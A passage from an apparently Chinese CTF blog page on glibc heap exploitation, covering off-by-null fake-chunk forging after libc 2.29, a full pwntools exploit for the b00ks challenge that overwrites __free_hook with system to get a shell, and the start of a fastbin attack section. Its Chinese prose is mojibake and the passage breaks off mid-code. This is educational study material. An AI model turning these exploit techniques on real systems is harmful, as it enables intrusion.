(chunksize(p) != prevsize))<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>      unlink_chunk (av, p);<br>    &#125;<br></code></pre></div></td></tr></table></figure><h2 id="åœ¨-libc-2-29-ä¹‹å"><a href="#åœ¨-libc-2-29-ä¹‹å" class="headerlink" title="åœ¨ libc-2.29 ä¹‹å"></a>åœ¨ libc-2.29 ä¹‹å</h2><p>ç”±äºè¿™ä¸¤è¡Œä»£ç çš„åŠ å…¥</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>  malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬éš¾ä»¥æ§åˆ¶ä¸€ä¸ªçœŸå® chunk çš„ size å­—æ®µï¼Œæ‰€ä»¥ä¼ ç»Ÿçš„ off-by-null æ–¹æ³•å¤±æ•ˆã€‚ä½†æ˜¯ï¼Œåªéœ€è¦æ»¡è¶³è¢« unlink çš„ chunk å’Œä¸‹ä¸€ä¸ª chunk ç›¸è¿ï¼Œæ‰€ä»¥ä»ç„¶å¯ä»¥ä¼ªé€  fake_chunkã€‚</p><p>ä¼ªé€ çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨ large bin é—ç•™çš„ fd_nextsize å’Œ bk_nextsize æŒ‡é’ˆã€‚ä»¥ fd_nextsize ä¸º fake_chunk çš„ fdï¼Œbk_nextsize ä¸º fake_chunk çš„ bkï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥å®Œå…¨æ§åˆ¶è¯¥ fake_chunk çš„ size å­—æ®µï¼ˆè¿™ä¸ªè¿‡ç¨‹ä¼šç ´ååŸ larg e bin chunk çš„ fd æŒ‡é’ˆï¼Œä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼‰ï¼ŒåŒæ—¶è¿˜å¯ä»¥æ§åˆ¶å…¶ fdï¼ˆé€šè¿‡éƒ¨åˆ†è¦†å†™ fd_nextsizeï¼‰ã€‚é€šè¿‡åœ¨åé¢ä½¿ç”¨å…¶ä»–çš„ ch22    `unk è¾…åŠ©ä¼ªé€ ï¼Œå¯ä»¥é€šè¿‡è¯¥æ£€æµ‹</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>  malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>ç„¶ååªéœ€è¦é€šè¿‡ unlink çš„æ£€æµ‹å°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯ <code>fd-&gt;bk == p &amp;&amp; bk-&gt;fd == p</code></p><p>å¦‚æœ large bin ä¸­ä»…æœ‰ä¸€ä¸ª chunkï¼Œé‚£ä¹ˆè¯¥ chunk çš„ä¸¤ä¸ª nextsize æŒ‡é’ˆéƒ½ä¼šæŒ‡å‘è‡ªå·±ï¼Œå¦‚ä¸‹</p><img src="../../image/ptmalloc_exp/largebin-struct.png" style="zoom:80%;" /><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶ fd_nextsize æŒ‡å‘å †ä¸Šçš„ä»»æ„åœ°å€ï¼Œå¯ä»¥å®¹æ˜“åœ°ä½¿ä¹‹æŒ‡å‘ä¸€ä¸ª fastbin + 0x10 - 0x18ï¼Œè€Œ fastbin ä¸­çš„ fd ä¹Ÿä¼šæŒ‡å‘å †ä¸Šçš„ä¸€ä¸ªåœ°å€ï¼Œé€šè¿‡éƒ¨åˆ†è¦†å†™è¯¥æŒ‡é’ˆä¹Ÿå¯ä»¥ä½¿è¯¥æŒ‡é’ˆæŒ‡å‘ä¹‹å‰çš„ large bin + 0x10ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ <code>fd-&gt;bk == p</code> çš„æ£€æµ‹ã€‚</p><p>ç”±äº bk_nextsize æˆ‘ä»¬æ— æ³•ä¿®æ”¹ï¼Œæ‰€ä»¥ bk-&gt;fd å¿…ç„¶åœ¨åŸå…ˆçš„ large bin chunk çš„ fd æŒ‡é’ˆå¤„ï¼ˆè¿™ä¸ª fd è¢«æˆ‘ä»¬ç ´åäº†ï¼‰ã€‚é€šè¿‡ fastbin çš„é“¾è¡¨ç‰¹æ€§å¯ä»¥åšåˆ°ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆä¸”ä¸å½±å“å…¶ä»–çš„æ•°æ®ï¼Œå†éƒ¨åˆ†è¦†å†™ä¹‹å°±å¯ä»¥é€šè¿‡ <code>bk-&gt;fd==p</code> çš„æ£€æµ‹äº†ã€‚</p><p>ç„¶åé€šè¿‡ off-by-one å‘ä½åœ°å€åˆå¹¶å°±å¯ä»¥å®ç° chunk overlapping äº†ï¼Œä¹‹åå¯ä»¥ leak libc_base å’Œ å †åœ°å€ï¼Œtcache æ‰“ <code>__free_hook</code> å³å¯ã€‚</p><h2 id="ç¤ºä¾‹-Asis-CTF-2016-b00ks"><a href="#ç¤ºä¾‹-Asis-CTF-2016-b00ks" class="headerlink" title="ç¤ºä¾‹: Asis CTF 2016 b00ks"></a>ç¤ºä¾‹: Asis CTF 2016 b00ks</h2><p>å…ˆpatchæˆglibc 2.27çš„ç‰ˆæœ¬. åªè¦å°äº2.29éƒ½ä¸€ä¸ªæ ·. </p><img src="../../image/ptmalloc_exp/image-20220810113456363.png" alt="image-20220810113456363" style="zoom:80%;" /><p>ä¸€è¿›å…¥ç¨‹åºå…ˆè¦æ±‚è®¾ç½®author name, è¿˜å¯ä»¥é€šè¿‡changeåŠŸèƒ½æ¥æ›´æ”¹, æœ€é•¿ä¸º32. ä¸è¿‡åœ¨stdin_readå‡½æ•°ä¸­è¾¹ç•Œæ£€æŸ¥ä¸æ­£ç¡®å¯¼è‡´ç»“å°¾ç©ºå­—ç¬¦æº¢å‡º. </p><p>createé‡Œmallocæµç¨‹: name-&gt;description-&gt;book. å‰ä¸¤ä¸ªä¸ºè‡ªå·±è®¾å®š, æœ€åä¸€ä¸ªä¸º0x20å­—èŠ‚. </p><p>é€šè¿‡æŸ¥çœ‹dataä¸­å˜é‡å¸ƒå±€å¯ä»¥çœ‹åˆ°author nameåœ¨slot_arrayä¸Šæ–¹, è¿™ä¸ªarrayå­˜çš„æ˜¯ä¸€å †bookç±»å‹çš„æŒ‡é’ˆ, è¿™ä¸ªç»“æ„ä½“ä½¿ç”¨mallocæ¥åˆ†é…ç©ºé—´: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">book</span>&#123;</span><br>    <span class="hljs-keyword">int</span> id;<span class="hljs-comment">//å 8å­—èŠ‚, å¯¹é½</span><br>    <span class="hljs-keyword">char</span>* name;<br>    <span class="hljs-keyword">char</span>* description;<br>    <span class="hljs-keyword">int</span> size;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>æ‰€ä»¥å…ˆè®©author nameçš„ç»“å°¾ç©ºå­—ç¬¦æº¢å‡ºåˆ°book1çš„æŒ‡é’ˆæœ€ä½å­—èŠ‚, ç„¶åè¯»å–å‡ºdetailå°±ä¼šè¿å¸¦æ‰“å°å‡ºbook1çš„æŒ‡é’ˆ, è¿™æ ·å°±æ³„éœ²å‡ºäº†ä¸€ä¸ª<strong>å †åœ°å€</strong>. </p><p>è¿˜å¯ä»¥é€šè¿‡æ¸…ç©ºæœ€ä½å­—èŠ‚æ¥ä½¿æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„ä¸€ä¸ªå †å—(æ¯”å¦‚è¯´é€šè¿‡editä¿®æ”¹çš„desc), è¿™æ ·ä¼šè‡ªåŠ¨è®¤ä¸ºé‚£æ˜¯ä¸€ä¸ªbookç»“æ„ä½“, ä»è€Œåœ¨printæ—¶è§£å¼•ç”¨nameå’ŒdescæŒ‡é’ˆ, æ‰“å°å‡ºç›¸åº”åœ°å€ä¸Šçš„å€¼. è¿˜å¯ä»¥åœ¨editä¸­ä¿®æ”¹descæŒ‡å‘çš„åœ°å€, ä»è€Œè¾¾åˆ°äº†ä»»æ„åœ°å€è¯»å†™çš„èƒ½åŠ›. </p><p>å…·ä½“è¿‡ç¨‹å¦‚ä¸‹:</p><ul><li>ç¨‹åºåˆšå¼€å§‹, ç¬¬ä¸€ä¸ªmallocä¼šä»0x5633ca39c260å¼€å§‹. æ³¨æ„åˆ°æœ€åä¸‰ä½æ˜¯0x260. </li><li>ä¸ºäº†å®ç°åˆ©ç”¨, è¦è®©book1çš„desc mem ptr(å’Œchunk ptrç›¸å¯¹, è”ç³»chunk2mem)çš„æœ€ä½å­—èŠ‚ä¸º0x00.</li><li>æœ€è¿‘çš„åœ°å€è‚¯å®šæ˜¯0x300, æ‰€ä»¥desc chunk pträ¸º0x2f0, ç•™ç»™name chunkçš„å¤§å°ä¸º0x90. </li><li>0x90éœ€è¦æˆ‘ä»¬ç”³è¯·0x80çš„ç©ºé—´. å³<code>create(0x80, &#39;a&#39;, 0x50, &#39;a&#39;)</code> </li></ul><p>gdbä¸­æŸ¥çœ‹, ä¸€é€šæ“ä½œåbook1çš„æŒ‡é’ˆæœ€ä½å­—èŠ‚æ¸…ç©ºååˆšå¥½æ˜¯book1çš„descç”¨æˆ·æŒ‡é’ˆ:</p><img src="../../image/ptmalloc_exp/image-20220810200039356.png" alt="image-20220810200039356" style="zoom:80%;" /><ul><li>ç„¶ååœ¨descé‡Œé¢ä¼ªé€ ä¸€ä¸ªbookç»“æ„ä½“, nameå’Œdescå‡å¯ç”¨æ¥ä»»æ„è¯», descèƒ½ç”¨æ¥ä»»æ„å†™(é€šè¿‡edit). </li></ul><p>é€šè¿‡ä¸€ä¸ªå †åœ°å€å¯ä»¥æ¨æ–­å‡ºelfåŸºåœ°å€å’Œ<strong>å…¶ä»–chunkçš„ç›¸å¯¹ä½ç½®</strong>, æ¥ä¸‹æ¥çš„æ–¹æ³•æ¯”å¦‚è¯´<code>__free_hook</code>, free_got(å› ä¸ºFULL RELROå¯¼è‡´ä¸å¯ç”¨). éœ€è¦libcåŸºåœ°å€, æœ‰ä¸¤ç§æ–¹æ³•:</p><ol><li>é€šè¿‡mmap, è¿™æ ·åˆ†é…çš„chunkä¼šå’Œlibcæœ‰å›ºå®šåç§». </li><li>é€šè¿‡largebinçš„fd_nextsize. åªæœ‰ä¸€ç»„å¤§å°ç›¸åŒçš„å…ƒç´ æ—¶ä¼šæŒ‡å‘libcä¸­çš„large head.</li></ol><p>åªæœ‰åœ¨topchunk(ä¸€èˆ¬æ˜¯è¿™æ ·, é¢˜ç›®åˆšå¼€å§‹çš„æ—¶å€™top chunkæ˜¯æœ€å¤§çš„chunk, åªè¦ç”³è¯·æ¯”è¿™å¤§çš„chunkå³å¯å®ç°mmapåˆ†é…)ä¸å¤Ÿç”¨çš„æ—¶å€™æ‰ä¼šä½¿ç”¨mmap, é€šè¿‡gdbçœ‹åˆ°topchunkä¸€å¼€å§‹æ˜¯0x21000. ç”±äºå¼€å¤´ä¸¤ä¸ªchunkè¢«ç”¨æ¥å­˜ç®¡ç†heapçš„ç»“æ„ä½“, æ‰€ä»¥<strong>ç›´æ¥ç”³è¯·0x21000çš„å †å—å³å¯</strong>. è¿˜è¦å°†nameæˆ–descå†™æˆ<code>&#39;/bin/sh&#39;</code> </p><p>ç”³è¯·å: </p><img src="../../image/ptmalloc_exp/image-20220810201642255.png" alt="image-20220810201642255" style="zoom:80%;" /><p>nameå’Œdescåˆ†åˆ«åˆ†åˆ°äº†è¿™ä¸¤ä¸ªä½ç½®:</p><img src="../../image/ptmalloc_exp/image-20220810201820968.png" alt="image-20220810201820968" style="zoom:80%;" /><p>æ³¨æ„åˆ°ç”³è¯·çš„æ˜¯0x21000, å®é™…å¤§å°æ˜¯0x22000, è¿™æ˜¯å› ä¸ºåŠ ä¸Šheaderçš„0x10å­—èŠ‚åè¿›è¡Œpageå¯¹é½çš„ç»“æœ.</p><p>ç”±äºå‘ç°ld.soä¹‹åçš„ä¸¤ä¸ªanonymä¹‹é—´æœ‰ç©ºéš™, ç©ºéš™å¤§å°éšæœºåŒ–, mmapå¤§æ¦‚ç‡æ”¾åœ¨ç©ºéš™ä¹‹åçš„anonymä¸­, å¯¼è‡´åˆ°libc.soçš„åç§»ä¸æ˜¯å›ºå®šå€¼. å¦‚æœéšæœºåŒ–åç»“æœéƒ½æ”¾åœ¨ld.soä¸­é—´, é‚£ä¹ˆåº”è¯¥æ˜¯å¯è¡Œçš„, ä¸è¿‡è¦å¤šå°è¯•å‡ æ¬¡. </p><p>åˆ°è¿™é‡Œçš„æµç¨‹å¦‚ä¸‹:</p><ul><li>å¯¹book1çš„desc fake chunkè¿›è¡Œä¿®æ”¹, è¿›è¡Œä¸€æ¬¡ä»»æ„è¯», è¯»å–book2çš„nameçš„å€¼. è¿™ä¸ªnameåœ°å€ç”¨ä¹‹å‰leakçš„book1åœ°å€åŠ ä¸Šä¸€ä¸ªåç§»å³å¯</li><li>ä¸¤ä¸ªbookçš„chunkç´§æŒ¨ç€çš„, è¿™ä¸ªåç§»ä¸º0x38, å’Œ0x40, å³å¯å®šä½åˆ°book2çš„nameå’ŒdescæŒ‡é’ˆçš„åœ°å€. </li><li>ç„¶åæ‰¾åˆ°<code>__free_hook</code> </li><li>ä½¿ç”¨descä»»æ„å†™è¦†ç›–<code>__free_hook</code>ä¸º<code>system</code>, </li><li>æ‰§è¡Œdelete </li><li>æˆåŠŸshell. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">from numpy <span class="hljs-keyword">import</span> lib<br>from pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./b00ks&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(binary)<br>ss=lambda x:p.send(x)       <span class="hljs-meta">#send string</span><br>sl=lambda x:p.sendline(x)<br>ru=lambda x:p.recvuntil(x)<br>rl=lambda :p.recvline()<br>ra=lambda :p.recv()         <span class="hljs-meta">#recv a</span><br>rn=lambda x:p.recv(x)       <span class="hljs-meta">#recv n</span><br>itt=lambda :p.interactive()<br>sla=lambda x,y:p.sendlineafter(x,y)<br><br>def firstAuthorName(name:str):<br>    ru(<span class="hljs-string">&#x27;name: &#x27;</span>)<br>    sl(name)<br><br>def create(name_size, name, desc_size, desc):<br>    ru(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(str(name_size))<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(name)<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(str(desc_size))<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(desc)<br><br>def change(authorName):<br>    ru(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;5&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(authorName)<br><br>def edit(id: <span class="hljs-keyword">int</span>, desc: bytes):<br>    ru(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(str(id))<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(desc)<br>    left = rl()+rl()<br>    <span class="hljs-keyword">if</span> b<span class="hljs-number">&#x27;U</span>nable<span class="hljs-number">&#x27;</span> in left:<br>        <span class="hljs-built_in">log</span>.error(<span class="hljs-string">&#x27;aslr not match expection!&#x27;</span>)<br><br>def get_detail() -&gt; tuple[<span class="hljs-keyword">int</span>, bytes, bytes, bytes]:<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span>only support get first book!!<span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    ru(b<span class="hljs-number">&#x27;</span>&gt; <span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    sl(b&#x27;</span><span class="hljs-number">4&#x27;</span>)<br>    line = rl()<br>    id = <span class="hljs-keyword">int</span>.from_bytes(line[<span class="hljs-number">4</span>:], byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>    name = rl()[<span class="hljs-number">6</span>:]<br>    desc = rl()[len(<span class="hljs-string">&#x27;Description: &#x27;</span>):]<br>    author =  rl()[len(<span class="hljs-string">&#x27;Author: &#x27;</span>):]<br>    <span class="hljs-keyword">return</span> id, name, desc, author<br><br>def <span class="hljs-keyword">delete</span>(id):<br>    ru(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;: &#x27;</span>)<br>    sl(str(id))<br><br><span class="hljs-meta">#main function!!!</span><br>def main():<br>    firstAuthorName(cyclic(<span class="hljs-number">32</span>))<br>    create(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>    create(<span class="hljs-number">0x20000</span><span class="hljs-number">-0x10</span>, <span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-number">0x20000</span><span class="hljs-number">-0x10</span>, <span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>    id, name, desc, author = get_detail()<br>    book1_addr = <span class="hljs-keyword">int</span>.from_bytes(author[<span class="hljs-number">32</span>:<span class="hljs-number">32</span>+<span class="hljs-number">6</span>], byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-built_in">log</span>.success(f<span class="hljs-number">&#x27;</span>get book <span class="hljs-number">1</span> struct pointer: &#123;hex(book1_addr)&#125;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # addr-0x60 point to itself in book1_desc</span><br><span class="hljs-string">    payload = flat([1, book1_addr+0x38, book1_addr-0x60, 0x50])</span><br><span class="hljs-string">    edit(1, payload)</span><br><span class="hljs-string">    change(cyclic(32))</span><br><span class="hljs-string">    id, name, desc, author = get_detail()</span><br><span class="hljs-string">    book2_name_addr = int.from_bytes(name, byteorder=&#x27;</span>little<span class="hljs-number">&#x27;</span>) &amp; <span class="hljs-number">0xffffffffffff</span><br>    <span class="hljs-built_in">log</span>.success(f<span class="hljs-number">&#x27;b</span>ook2 name addr: &#123;hex(book2_name_addr)&#125;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    libc = ELF(&#x27;</span>/glibs/<span class="hljs-number">2.27</span><span class="hljs-number">-3u</span>buntu1_amd64/libc<span class="hljs-number">-2.27</span>.so<span class="hljs-number">&#x27;</span>)<br>    libc_base = book2_name_addr - <span class="hljs-number">0x606010</span><br>    __free_hook_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    <span class="hljs-built_in">log</span>.success(f<span class="hljs-number">&#x27;</span>__free_hook: &#123;hex(__free_hook_addr)&#125;\t system_addr: &#123;hex(system_addr)&#125;<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    payload = flat([1, book1_addr+0x38+0x90, __free_hook_addr, 0x50])</span><br><span class="hljs-string">    edit(1, payload)</span><br><span class="hljs-string">    edit(1, pack(system_addr))</span><br><span class="hljs-string">    delete(2)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # gdb.attach(p)</span><br><span class="hljs-string">    itt()</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &#x27;</span>__main__<span class="hljs-number">&#x27;</span>:<br>    main()<br></code></pre></div></td></tr></table></figure><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><ol><li>chunk extend å°±æ˜¯é€šè¿‡æ§åˆ¶ size å’Œ pre_size åŸŸæ¥å®ç°è·¨è¶Šå—æ“ä½œä»è€Œå¯¼è‡´ overlapping</li><li>é€šè¿‡ extend å¯ä»¥å®ç° chunk overlappingï¼Œé€šè¿‡ overlapping å¯ä»¥æ§åˆ¶ chunk çš„ fd/bk æŒ‡é’ˆä»è€Œå¯ä»¥å®ç° fastbin attack ç­‰åˆ©ç”¨</li></ol><p>ä¾‹é¢˜ä¹Ÿæ˜¯heapstorm2. </p><h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><p>å‡ ä¹å…¨ä¸º<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">CTF-WiKi</a>, åšäº†äº›ä¿®æ”¹ä»¥åŠæ·»åŠ äº†ä¸€ç‚¹ä¸ªäººæƒ³æ³•</p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>fastbin attack æ˜¯ä¸€ç±»æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ˜¯æŒ‡æ‰€æœ‰åŸºäº fastbin æœºåˆ¶çš„æ¼æ´åˆ©ç”¨æ–¹æ³•ã€‚è¿™ç±»åˆ©ç”¨çš„å‰ææ˜¯ï¼š</p><ul><li>å­˜åœ¨å †æº¢å‡ºã€use-after-free ç­‰èƒ½æ§åˆ¶ chunk å†…å®¹çš„æ¼æ´</li><li>æ¼æ´å‘ç”Ÿäº fastbin ç±»å‹çš„ chunk ä¸­</li></ul><p>å¦‚æœç»†åˆ†çš„è¯ï¼Œå¯ä»¥åšå¦‚ä¸‹çš„åˆ†ç±»ï¼š</p><ul><li><strong>Fastbin Double Free</strong> </li><li><strong>House of Spirit</strong> </li><li><strong>Alloc to Stack</strong> </li><li><strong>Arbitrary Alloc</strong> </li></ul><p>å…¶ä¸­ï¼Œå‰ä¸¤ç§ä¸»è¦æ¼æ´ä¾§é‡äºåˆ©ç”¨ <code>free</code> å‡½æ•°é‡Šæ”¾<strong>çœŸçš„ chunk æˆ–ä¼ªé€ çš„ chunk</strong>ï¼Œç„¶åå†æ¬¡ç”³è¯· chunk è¿›è¡Œæ”»å‡»ï¼Œåä¸¤ç§ä¾§é‡äºæ•…æ„ä¿®æ”¹ <code>fd</code> æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨ <code>malloc</code> ç”³è¯·æŒ‡å®šä½ç½® chunk è¿›è¡Œæ”»å‡»ã€‚</p><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>Fastbin Double Free æ˜¯æŒ‡ fastbin çš„ chunk å¯ä»¥è¢«å¤šæ¬¡é‡Šæ”¾ï¼Œå› æ­¤å¯ä»¥åœ¨ fastbin é“¾è¡¨ä¸­å­˜åœ¨å¤šæ¬¡ã€‚è¿™æ ·å¯¼è‡´çš„åæœæ˜¯å¤šæ¬¡åˆ†é…å¯ä»¥ä» fastbin é“¾è¡¨ä¸­å–å‡ºåŒä¸€ä¸ªå †å—ï¼Œç›¸å½“äºå¤šä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå †å—ï¼Œç»“åˆå †å—çš„æ•°æ®å†…å®¹å¯ä»¥å®ç°ç±»ä¼¼äºç±»å‹æ··æ·† (type confused) çš„æ•ˆæœã€‚</p><p>Fastbin Double Free èƒ½å¤ŸæˆåŠŸåˆ©ç”¨ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†çš„åŸå› </p><ol><li>fastbin çš„å †å—è¢«é‡Šæ”¾å next_chunk çš„ <strong>pre_inuse</strong> ä½ä¸ä¼šè¢«æ¸…ç©º</li><li>fastbin åœ¨æ‰§è¡Œ free çš„æ—¶å€™ä»…éªŒè¯äº† <strong>main_arena</strong> ç›´æ¥æŒ‡å‘çš„å—ï¼Œå³é“¾è¡¨æŒ‡é’ˆå¤´éƒ¨çš„å—ã€‚å¯¹äºé“¾è¡¨åé¢çš„å—ï¼Œå¹¶æ²¡æœ‰è¿›è¡ŒéªŒè¯ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> pre_size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fd;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br>CHUNK bss_chunk;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span 